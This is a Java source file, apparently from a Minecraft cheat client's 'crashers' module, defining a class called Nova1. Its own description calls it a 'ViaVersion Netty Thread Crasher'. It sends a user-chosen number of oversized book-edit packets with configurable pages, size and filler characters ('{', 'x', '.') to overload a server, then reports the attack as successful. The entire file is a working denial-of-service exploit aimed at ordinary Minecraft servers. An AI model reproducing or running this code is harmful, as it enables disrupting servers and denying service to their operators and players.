package us.whitedev.crashers.impl;

import net.minecraft.network.protocol.game.ServerboundEditBookPacket;
import us.whitedev.crashers.Crasher;
import us.whitedev.gui.clickgui.ClickGui;
import us.whitedev.helpers.PacketHelper;
import us.whitedev.utils.OptionType;
import us.whitedev.utils.OptionUtil;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class Nova1 implements Crasher {
    private static final String METHOD_NAME = "Nova1";
    private boolean enabled = false;

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[2]);
        int pagesAmount = Integer.parseInt(args[3]);
        int size = Integer.parseInt(args[4]);
        String mode = args[5].toUpperCase();
        setEnabled(true);

        msgHelper.sendMessage("Starting crashing with &f" + (ClickGui.isVisible ? getName() : "******"), true);
        for (int i = 0; i < packets; i++) {
            List<String> pages = new ArrayList<>();
            String content;
            switch (mode) {
                case "INDEX" -> content = "{";
                case "NONE" -> content = "x";
                default -> content = ".";
            }
            for (int j = 0; j <= pagesAmount; j++) {
                pages.add(content.repeat(size));
            }
            PacketHelper.send(new ServerboundEditBookPacket(-1, pages, Optional.of("xynis")));
        }

        setEnabled(false);
        msgHelper.sendMessage("Attack &asuccessful &7finished!", true);
    }

    @Override
    public String getName() {
        return METHOD_NAME;
    }

    @Override
    public boolean getEnabled() {
        return enabled;
    }

    @Override
    public void setEnabled(boolean bool) {
        this.enabled = bool;
    }

    @Override
    public List<OptionUtil> getOptions(){
        return List.of(
                new OptionUtil("Packets", OptionType.INTEGER),
                new OptionUtil("Pages", OptionType.INTEGER),
                new OptionUtil("Size", OptionType.INTEGER),
                new OptionUtil("Mode", OptionType.LIST, new String[]{"Legacy", "Index", "None"})
        );
    }

    @Override
    public String getArgsUsage() {
        return "packets[100], pages[100], size[1], mode[legacy]";
    }


    @Override
    public String getDescription() {
        return "ViaVersion Netty Thread Crasher";
    }
}